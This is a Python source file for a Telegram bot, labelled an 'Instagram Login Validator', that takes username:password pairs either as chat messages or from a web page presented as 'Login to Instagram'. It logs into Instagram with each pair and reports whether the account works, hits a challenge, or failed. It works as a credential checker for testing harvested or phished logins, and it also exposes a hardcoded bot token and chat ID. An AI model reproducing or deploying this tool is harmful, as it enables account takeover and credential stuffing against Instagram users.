# ==============================================
# INSTAGRAM LOGIN VALIDATOR BOT
# ==============================================

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters
from instagrapi import Client
import re
import asyncio

# ==============================================
# CONFIGURATION - REPLACE WITH YOUR VALUES
# ==============================================
BOT_TOKEN = "8951869861:AAGZUAgqpWGu2kp718r5bHmVmZwG423L-68_"  # From @BotFather
CHAT_ID = "7374813787"      # From @userinfobot

# Only allow this user to use the bot (security)
AUTHORIZED_USERS = [CHAT_ID]  # Add more chat IDs if needed
# ==============================================

# Store pending logins temporarily
pending_logins = {}

# ==============================================
# VALIDATION FUNCTION
# ==============================================

async def validate_instagram(username, password):
    """
    Attempts to log into Instagram with given credentials.
    Returns (success, message)
    """
    try:
        # Create a new Instagram client
        cl = Client()
        
        # Attempt login
        cl.login(username, password)
        
        # If we get here, login was successful!
        user_id = cl.user_id
        full_name = cl.username  # or get full name if available
        
        # Save session for future use (optional)
        # cl.dump_settings(f"sessions/{username}.json")
        
        return True, f"✅ **VALID CREDENTIALS!**\n\n👤 Username: {username}\n🆔 User ID: {user_id}\n\nThis account works!"
        
    except Exception as e:
        error_msg = str(e)
        
        # Check common error types
        if "login_required" in error_msg or "challenge" in error_msg:
            return False, f"⚠️ **CHALLENGE REQUIRED**\n\nUsername: {username}\n\nInstagram needs verification (2FA or security check)."
        elif "wrong password" in error_msg.lower():
            return False, f"❌ **WRONG PASSWORD**\n\nUsername: {username}\n\nThe password is incorrect."
        elif "user not found" in error_msg.lower():
            return False, f"❌ **USER NOT FOUND**\n\nUsername: {username}\n\nThis account doesn't exist."
        else:
            return False, f"❌ **LOGIN FAILED**\n\nUsername: {username}\n\nError: {error_msg[:200]}"

# ==============================================
# TELEGRAM COMMAND HANDLERS
# ==============================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send welcome message with login button"""
    user_id = str(update.message.from_user.id)
    
    # Check if user is authorized
    if user_id not in AUTHORIZED_USERS:
        await update.message.reply_text("⛔ You are not authorized to use this bot.")
        return
    
    # Create the button
    button = InlineKeyboardButton(
        "🔐 Login to Instagram",
        web_app={"url": "https://telegrambot-teal-delta.vercel.app"}  # Replace with your URL
    )
    
    keyboard = [[button]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "👋 **Instagram Login Validator**\n\n"
        "Click the button below to enter your credentials.\n\n"
        "🔍 I will automatically check if they work!\n"
        "⚠️ Use a test account for safety.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show help message"""
    await update.message.reply_text(
        "🤖 **How to use this bot:**\n\n"
        "1️⃣ Click 'Login to Instagram'\n"
        "2️⃣ Enter your username and password\n"
        "3️⃣ I'll check if they work and tell you the result!\n\n"
        "**Results:**\n"
        "✅ Valid credentials\n"
        "❌ Invalid credentials\n"
        "⚠️ Challenge required (2FA/security check)\n\n"
        "💡 Use a test account for safety!",
        parse_mode="Markdown"
    )

async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle data sent from the web app"""
    user_id = str(update.message.from_user.id)
    
    # Check authorization
    if user_id not in AUTHORIZED_USERS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    # Get the data sent from HTML
    data = update.message.web_app_data.data
    
    try:
        # Parse the data (format: "username:password")
        parts = data.split(':')
        if len(parts) >= 2:
            username = parts[0].strip()
            password = ':'.join(parts[1:]).strip()  # Handle passwords with :
        else:
            await update.message.reply_text("❌ Invalid data format.")
            return
    except:
        await update.message.reply_text("❌ Could not parse credentials.")
        return
    
    if not username or not password:
        await update.message.reply_text("❌ Username and password are required.")
        return
    
    # Send "Checking..." message
    status_msg = await update.message.reply_text(
        f"🔍 **Checking credentials...**\n\n"
        f"👤 Username: {username}\n"
        f"⏳ Please wait...",
        parse_mode="Markdown"
    )
    
    # Validate credentials
    success, message = await validate_instagram(username, password)
    
    # Update the message with result
    await status_msg.edit_text(
        f"📊 **Validation Result**\n\n{message}",
        parse_mode="Markdown"
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle manual credential entry (username:password)"""
    user_id = str(update.message.from_user.id)
    
    # Check authorization
    if user_id not in AUTHORIZED_USERS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    
    text = update.message.text
    
    # Check if it's a credential format (username:password)
    if ':' in text and not text.startswith('/'):
        parts = text.split(':')
        username = parts[0].strip()
        password = ':'.join(parts[1:]).strip()
        
        if not username or not password:
            await update.message.reply_text("❌ Format: username:password")
            return
        
        # Show checking status
        status_msg = await update.message.reply_text(
            f"🔍 Checking: {username}..."
        )
        
        # Validate
        success, message = await validate_instagram(username, password)
        
        await status_msg.edit_text(
            f"📊 **Result**\n\n{message}",
            parse_mode="Markdown"
        )
    else:
        # If not credentials, show help
        await update.message.reply_text(
            "Send credentials in format:\n`username:password`\n\n"
            "Or click the Login button!",
            parse_mode="Markdown"
        )

# ==============================================
# START THE BOT
# ==============================================

def main():
    # Create the application
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Add command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    
    # Handle web app data (from HTML)
    app.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_data))
    
    # Handle regular messages
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    # Start the bot
    print("🤖 Instagram Validator Bot is running...")
    print(f"📱 Bot username: @Mytelegrambot_2001_bot")
    print("Waiting for login attempts...")
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
